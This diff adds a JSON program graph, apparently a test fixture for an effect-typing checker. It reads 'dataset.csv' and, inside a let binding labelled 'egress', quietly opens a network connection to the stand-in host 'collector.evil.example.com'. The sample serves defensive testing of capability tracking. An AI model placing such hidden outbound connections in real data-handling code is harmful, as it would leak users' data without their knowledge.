@@ -1,0 +1,32 @@
+{
+  "version": 1,
+  "root": "exfilLet",
+  "nodes": {
+    "strT":      { "type": "PrimitiveType", "kind": "String" },
+    "bytesT":    { "type": "PrimitiveType", "kind": "Bytes" },
+    "intT":      { "type": "PrimitiveType", "kind": "Int" },
+
+    "readFx":    { "type": "EffectCategory", "categoryName": "Filesystem.Read", "parameters": ["strT"] },
+    "readT":     { "type": "FunctionType", "parameters": ["strT"], "result": "bytesT" },
+    "readFn":    { "type": "ForeignNode", "target": "strand-builtin:Fs.Read", "foreignType": "readT", "effects": ["readFx"], "effectProjections": [{ "category": "readFx", "sources": [{ "kind": "ArgRef", "index": 0 }] }] },
+
+    "lenT":      { "type": "FunctionType", "parameters": ["bytesT"], "result": "intT" },
+    "lenFn":     { "type": "ForeignNode", "target": "strand-builtin:Bytes.Length", "foreignType": "lenT" },
+
+    "datasetPath": { "type": "StringLit", "value": "dataset.csv" },
+    "readDecl":  { "type": "EffectDecl", "effectType": "readFx", "parameters": ["datasetPath"] },
+    "readApp":   { "type": "Application", "function": "readFn", "arguments": ["datasetPath"], "typeArguments": [], "effectInstances": ["readDecl"] },
+    "analytic":  { "type": "Application", "function": "lenFn", "arguments": ["readApp"] },
+
+    "connectFx": { "type": "EffectCategory", "categoryName": "Network.Connect", "parameters": ["strT", "intT"] },
+    "connectT":  { "type": "FunctionType", "parameters": ["strT", "intT"], "result": "bytesT" },
+    "connectFn": { "type": "ForeignNode", "target": "strand-builtin:Net.Connect", "foreignType": "connectT", "effects": ["connectFx"], "effectProjections": [{ "category": "connectFx", "sources": [{ "kind": "ArgRef", "index": 0 }, { "kind": "ArgRef", "index": 1 }] }] },
+
+    "exfilHost": { "type": "StringLit", "value": "collector.evil.example.com" },
+    "exfilPort": { "type": "IntLit", "value": 443 },
+    "connectDecl": { "type": "EffectDecl", "effectType": "connectFx", "parameters": ["exfilHost", "exfilPort"] },
+    "connectApp": { "type": "Application", "function": "connectFn", "arguments": ["exfilHost", "exfilPort"], "typeArguments": [], "effectInstances": ["connectDecl"] },
+
+    "exfilLet":  { "type": "Let", "name": "egress", "value": "connectApp", "body": "analytic" }
+  }
+}
